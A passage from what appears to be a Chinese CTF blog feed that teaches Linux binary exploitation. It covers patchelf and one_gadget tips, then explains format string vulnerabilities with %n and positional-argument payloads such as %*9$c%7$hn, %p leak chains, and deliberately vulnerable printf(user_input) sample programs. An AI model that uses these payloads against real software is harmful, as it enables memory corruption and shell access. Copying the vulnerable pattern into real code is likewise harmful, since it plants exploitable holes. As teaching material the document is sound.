class="token comment"># 生成符号链接, 使 Ubuntu 的 /lib64/ld-2.27.so 指向 /glibc-all-in-one的路径/libs/2.27-3ubuntu1_amd64/ld-2.26.so, 以便动态链接器能够找到正确的文件并加载所需的共享库</span><span class="token function">sudo</span> <span class="token function">ln</span> /glibc-all-in-one的路径/libs/2.27-3ubuntu1_amd64/ld-2.26.so /lib64/ld-2.27.so   <span class="token comment"># 64 位为 /lib64, 32 位为 /lib</span><span class="token comment"># 查看生成的符号链接</span><span class="token function">ls</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>更改程序的 libc：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 设置解释器</span>patchelf --set-interpreter 替换的新ld 二进制程序<span class="token comment"># 设置 libc</span>patchelf --replace-needed 原来的libc 替换的新libc 二进制程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果不想手动设置 libc，也可以使用下面的方法直接指定文件夹（推荐）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 设置解释器</span>patchelf --set-interpreter 替换的新ld 二进制程序<span class="token comment"># 设置文件夹</span>patchelf --set-rpath 替换的新ld所在的文件夹 二进制程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>以一个具体的例子说明：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Pwntools%E4%B8%8Eexp%E6%8A%80%E5%B7%A7-patchelf1.png" alt="Pwntools与exp技巧-patchelf1.png"></p><ol start="2"><li>如果需要使用 gdb 进行调试查看堆栈的话，需要在 gdb 中设置 debug 文件夹</li></ol><p>以 <code>2.27-3ubuntu1_amd64</code> 为例  </p><p>从 <code>glibc-all-in-one</code> 中复制 <code>.debug</code> 文件夹到 PWN 题程序目录中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> <span class="token parameter variable">-r</span> opt/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/.debug/ ./debug<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 gdb 中设置 debug 文件夹：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> debug-file-directory debug/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h1><blockquote><p>one_gadget 是 libc 中存在的一些执行 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 的片段，当可以泄露 libc 地址，并且可以知道 libc 版本的时候，可以使用此方法来快速控制指令寄存器开启 shell</p><p>相比于 <code>system(&quot;/bin/sh&quot;)</code>，这种方式更加方便，不用控制 <code>RDI</code>、<code>RSI</code>、<code>RDX</code> 等参数，运用于不利构造参数的情况  </p><p><strong>每条指令片段都有对应的使用限制，需要注意</strong></p></blockquote><p>使用方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">one_gadget libc文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Pwntools%E4%B8%8Eexp%E6%8A%80%E5%B7%A7-one_gadget1.png" alt="Pwntools与exp技巧-one_gadget1.png"></p><p>同时要注意 one_gadget 的使用条件</p><p>在每一个可以利用的 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 片段后都有一个 constraints 作为约束条件：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">constraints:  <span class="token punctuation">[</span>r15<span class="token punctuation">]</span> <span class="token operator">==</span> NULL <span class="token operator">||</span> r15 <span class="token operator">==</span> NULL  <span class="token punctuation">[</span>r12<span class="token punctuation">]</span> <span class="token operator">==</span> NULL <span class="token operator">||</span> r12 <span class="token operator">==</span> NULL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用的时候多尝试几个就行</p><hr>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Shellcode </tag>
            
            <tag> Pwntools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞与利用</title>
      <link href="/posts/262e948.html"/>
      <url>/posts/262e948.html</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><blockquote><p>格式化字符串漏洞，是由编程时使用 <code>printf</code> 函数，在将数据格式化输出时产生的漏洞</p><p>其中包括 <code>printf</code>，<code>fprintf</code>，<code>sprintf</code>，<code>snprintf</code>，<code>vprintf</code>，<code>vfprintf</code>，<code>vsprintf</code>，<code>vsnprintf</code> 等函数，它们可以将数据格式化后输出</p><p>一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, ctfer)</code>，偷懒写成了：<code>printf(ctfer)</code>，此会存在格式化字符串漏洞</p></blockquote><p>这种漏洞在目前的真实环境下出现的比较少，因为现在的编译器在编译的过程中可以识别到该漏洞</p><hr><h2 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h2><blockquote><p><code>printf()</code> 是 C 语言中少有的支持可变参数的库函数，被调用者无法知道函数调用之前有多少个参数被压入栈中，因此 <code>printf()</code> 要求传入一个 <code>format</code> 参数以指定参数的数量和类型，然后 <code>printf()</code> 会严格的按照 <code>format</code> 参数所规定的格式逐个从栈中取出并输出参数</p></blockquote><ol><li>示例一</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %s %s %s %s\n"</span><span class="token punctuation">,</span> str1<span class="token punctuation">,</span> str2<span class="token punctuation">,</span> str3<span class="token punctuation">,</span> str4<span class="token punctuation">,</span> str5<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>若 <code>printf()</code> 中少于 6 个参数，则直接打印寄存器中的值</strong></p><blockquote><p><code>printf()</code> 按照参数的顺序，从左到右依次对应寄存器：RDI，RSI，RDX，RCX，R8，R9</p></blockquote><ol start="2"><li>示例二</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %s %s %s %s %s %s %s %s %s %s\n"</span><span class="token punctuation">,</span> str1<span class="token punctuation">,</span> str2<span class="token punctuation">,</span> str3<span class="token punctuation">,</span> str4<span class="token punctuation">,</span> str5<span class="token punctuation">,</span> str6<span class="token punctuation">,</span> str7<span class="token punctuation">,</span> str8<span class="token punctuation">,</span> str9<span class="token punctuation">,</span> str10<span class="token punctuation">,</span> str11<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>若 <code>printf()</code> 中多于 6 个参数，从第 7 个参数开始打印栈中的数据</strong></p><blockquote><p>也就是说，<mark><code>printf()</code> 打印数据的顺序为：RDI，RSI，RDX，RCX，R8，R9，栈空间</mark></p></blockquote><ol start="3"><li>示例三</li></ol><p>如果给出的 <code>format</code> 参数的个数 &gt; 待输出的参数数量</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %d %d %d %d %x %x"</span><span class="token punctuation">,</span> <span class="token string">"num"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：  </p><pre class="line-numbers language-c" data-language="c"><code class="language-c">num <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> ed5ffcc0 <span class="token number">3</span>b5b143f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>虽然给了 7 个格式化输出的参数，但是实际压入栈中的参数只有 5 个，所以 <code>printf</code> 会输出两个本不应该输出的地址内容，也就泄露出了栈中的数据</p></blockquote><hr><h3 id="printf-的栈结构"><a href="#printf-的栈结构" class="headerlink" title="printf 的栈结构"></a>printf 的栈结构</h3><p>如果格式化输出参数是 <code>%6$n</code>，就是把 <code>%6$n</code> 之前输出的长度赋值给 <code>printf()</code> 的第 6 个参数，但是 <code>printf</code> 函数不知道自己的栈有多大，所以只需要把这个偏移数值定位到能够修改的内存空间</p><p>以下是 <code>printf()</code> 的栈结构示例：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E2.png" alt="CTF - Pwn_格式化字符串漏洞2.png"></p><hr><h3 id="格式化输出说明符"><a href="#格式化输出说明符" class="headerlink" title="格式化输出说明符"></a>格式化输出说明符</h3><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E1.png" alt="CTF - Pwn_格式化字符串漏洞1.png"></p><ol><li><p><code>%n</code> 可以将一个 <code>int</code> 型的值（4 字节）写入指定的地址中，可以实现栈空间的随意改写</p></li><li><p>除 <code>%n</code> 以外，还有 <code>%hn</code>、<code>%hhn</code>、<code>%lln</code>，分别将 2 字节、1 字节、8 字节写入指定的地址</p></li></ol><blockquote><p>助记方法：</p><p><em>h 就是 half（一半）的意思</em>，<code>%n</code> 是 4 字节，因此 <code>%hn</code> 是 2 字节，<code>%hhn</code> 是 1 字节</p></blockquote><hr><h2 id="关于-的用法"><a href="#关于-的用法" class="headerlink" title="关于 $ 的用法"></a>关于 $ 的用法</h2><blockquote><p><code>$</code> 通常配合 <code>%</code> 一起使用，用来指定参数，用法为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span>参数顺序$格式化说明符<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"hello "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"world "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"I "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str4<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"am "</span><span class="token punctuation">;</span><span class="token keyword">char</span> str5<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"Tom "</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%2$s %s %s %s %s %s\n"</span><span class="token punctuation">,</span> str1<span class="token punctuation">,</span> str2<span class="token punctuation">,</span> str3<span class="token punctuation">,</span> str4<span class="token punctuation">,</span> str5 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：  </p><pre class="line-numbers language-c" data-language="c"><code class="language-c">world hello world I am Tom   <span class="token comment">// %2$s 相当于按照 %s 的格式，输出第 2 个数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>通过 <code>%n$p</code>，合理控制 <code>n</code> 的值就能准确获取栈中的某个数据，这也是格式化字符串漏洞的关键</strong></p><blockquote><p>这种方法的好处在于，无需输入繁琐的参数就可以快速、准确地获取栈中的某个数据</p><p><em>例如，要想泄露出第十个数据的地址，<code>printf()</code> 需要写 10 个 <code>%p</code>，但使用这种方式只需要一个 <code>%10$p</code> 就可以解决</em></p><p><mark>在 64 位程序中，使用 <code>%6$p</code> 即可输出 RSP 所指向的地址（即栈顶元素）中存放的指针</mark></p><p><mark>在 32 位程序中，<code>%0$p</code> 即代表 RSP 所指向的地址（即栈顶元素）中存放的指针</mark></p></blockquote><hr><h2 id="关于-n-的用法"><a href="#关于-n-的用法" class="headerlink" title="关于 %n 的用法"></a>关于 %n 的用法</h2><blockquote><p><code>%n</code> 是一个特殊的格式说明符，它不打印某些内容，而是用于获取到目前为止写入到输出中的字符数量，<code>printf()</code> <strong>将出现在 <code>%n</code> 之前的字符数量存储到对应的参数所指向的变量中</strong></p></blockquote><p>示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">int</span> c<span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to uf4te %nHello "</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：  </p><pre class="line-numbers language-c" data-language="c"><code class="language-c">Welcome to uf4te Hello <span class="token number">17</span>   <span class="token comment">// 这里的 %n 并不输出，而是将 %n 之前的字符数量 17 赋值给变量 c</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>也就是说，*<code>%n</code> 参数把他前面输出的字符数赋值给了变量 <code>c</code>*</p><p>因此，只要更改 <code>c</code> 所对应栈中地址的值，就可以把想要的数值赋给对应地址</p></blockquote><hr><h2 id="利用-和-n-读取和修改数据"><a href="#利用-和-n-读取和修改数据" class="headerlink" title="利用 $ 和 %n 读取和修改数据"></a>利用 $ 和 %n 读取和修改数据</h2><ol><li>读取栈上的数据</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span>参数顺序$格式化说明符<span class="token comment">// 例如：%7$lx</span><span class="token comment">// 表示：以 lx 的格式读取第 7 个参数的值</span><span class="token comment">// 这里的格式化说明符不包括 %n、%hn、%hhn、%lln 等</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><mark>在 64 位程序中，使用 <code>%6$p</code> 即可输出 RSP 所指向的地址（即栈顶元素）中存放的指针</mark></p><p><mark>在 32 位程序中，<code>%0$p</code> 即代表 RSP 所指向的地址（即栈顶元素）中存放的指针</mark></p></blockquote><ol start="2"><li>修改栈上的数据</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span>数值c<span class="token operator">%</span>参数顺序$格式化说明符<span class="token comment">// 例如：%100c%12$hhn</span><span class="token comment">// 表示：向第 12 个参数写入 100 这个数值（十进制）</span><span class="token comment">// 这里的格式化说明符只能用 %n、%hn、%hhn、%lln 等</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="关于-的用法-1"><a href="#关于-的用法-1" class="headerlink" title="关于 * 的用法"></a>关于 * 的用法</h2><blockquote><p>在格式化字符串中，使用 <code>*</code> 也可以用来修改栈上的数据，但与 <code>$</code> 和 <code>%n</code> 不同在于：  </p><p>（1）<code>$</code> 和 <code>%n</code> 具体要修改的数值是我们自己通过 <code>%数值c</code> 定义的</p><p>（2）<code>*</code> 要修改的数值是以复制的形式实现的，因此不能由我们自己来定义</p></blockquote><p><code>*</code> 的使用格式：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">%</span><span class="token operator">*</span>参数顺序$c<span class="token operator">%</span>参数顺序$格式化说明符<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例题：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf2<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf3<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span><span class="token punctuation">)</span> buf1<span class="token punctuation">;</span><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/random"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> d <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf1<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf3<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf2<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> buf3<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//gcc fmt_str_level_star.c  -o fmt_str_level_star_x64</span><span class="token comment">//gcc -m32 fmt_str_level_star.c   -o fmt_str_level_star_x86</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在该例题中，<code>buf1</code> 和 <code>buf3</code> 是随机数，当这两个值相等时即可获得 shell</p><p>而 <code>buf2</code> 是由我们输入的，且 <code>printf(buf2)</code> 存在格式化字符串漏洞，因此思路就是利用格式化字符串漏洞将 <code>buf1</code> 和 <code>buf3</code> 修改为相等</p><p>以 64 位程序为例，根据调试可知：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E5.png" alt="CTF - Pwn_格式化字符串漏洞5.png"></p><p>我们输入的 <code>buf2</code> 在栈中位于 <code>buf1</code> 和 <code>buf3</code> 下方</p><p>在 64 位程序中 <code>%6$p</code> 即是 RSP 所在位置，而地址 <code>0x7fffffffda98</code> 处指向 <code>buf1 = 0x72b</code> 所在的地址 <code>0x7fffffffdaa0</code>，位于第 7 个位置</p><p><code>buf3</code> 所存放的位置则位于第 9 个位置，因此只需要通过格式化字符串漏洞将 <code>buf3</code> 的值赋给地址 <code>0x7fffffffda98</code> 处指向的位置</p><p>由于 <code>buf1</code> 和 <code>buf3</code> 都是 2 字节，于是使用：<code>%*9$c%7$hn</code></p><p>即可发现执行 <code>printf(%*9$c%7$hn)</code> 后，<code>buf1</code> 与 <code>buf3</code> 相等</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E6.png" alt="CTF - Pwn_格式化字符串漏洞6.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E7.png" alt="CTF - Pwn_格式化字符串漏洞7.png"></p><hr><h1 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h1><h2 id="漏洞利用流程"><a href="#漏洞利用流程" class="headerlink" title="漏洞利用流程"></a>漏洞利用流程</h2><p>在 pwn 题中遇到格式化字符串漏洞时，一般会分两大步实现漏洞利用：</p><ol><li><p>构造一个 payload，寻找输入字符串到栈顶指针的偏移</p></li><li><p>利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写</p></li></ol><hr><h2 id="泄露任意地址内容"><a href="#泄露任意地址内容" class="headerlink" title="泄露任意地址内容"></a>泄露任意地址内容</h2><p>32 位程序的代码示例：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"leave your message please:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"your message is:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> pwnme <span class="token operator">==</span> <span class="token number">8</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you pwned me, here is your flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Thank you!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到第 7 行，<code>printf</code> 输出了在前面输入的 <code>v8</code> 变量，但是并没有给出任何格式化参数</p><p>我们可以通过构造 <code>v8</code> 的值来让 <code>printf</code> 误以为程序给出了格式化参数，从而按照我们的意思输出我们所需的值</p><p>程序输入输出示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># please tell me your name:</span>aaaa<span class="token comment"># leave your message please:</span>AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p<span class="token comment"># hello aaaa</span><span class="token comment"># your message is:</span>AAAA 0xffffd13e 0xf7fae580 0xffffd19c 0xf7ffdae0 0x1 0xf7fcb410 0x61610001 0xa6161 <span class="token punctuation">(</span>nil<span class="token punctuation">)</span> 0x41414141 0x25207025 0x70252070 0x20702520 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025 0x20207025<span class="token comment"># Thank you!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到我们输入的 <code>AAAA</code> 对应的 <code>0x41414141</code> 在第 10 个位置（<code>%p</code> 是将 <code>AAAA</code> 以十六进制地址的形式打印出来）</p><p>因为从 <code>AAAA</code> 到 <code>0x41414141</code> 之间有 9 个输出值，所以 <code>v8</code> 在相对第 10 个参数位置</p><blockquote><p>显然，程序泄露出了 <code>printf</code> 函数的栈帧中输出字符串后 19 个内存单元的值，理论上来说，我们可以使用这个漏洞任意读取栈中的值</p><p>其实 <code>printf</code> 函数根本没有这么多个参数，只不过他自己并不知道</p></blockquote><hr><h2 id="构造-exp-的实例"><a href="#构造-exp-的实例" class="headerlink" title="构造 exp 的实例"></a>构造 exp 的实例</h2><p>例题来自攻防世界：<a href="https://adworld.xctf.org.cn/media/file/task/e41a0f684d0e497f87bb309f91737e4d">【攻防世界】CGfsb</a></p><p>该程序为 32 位程序，main 函数：</p><p><img 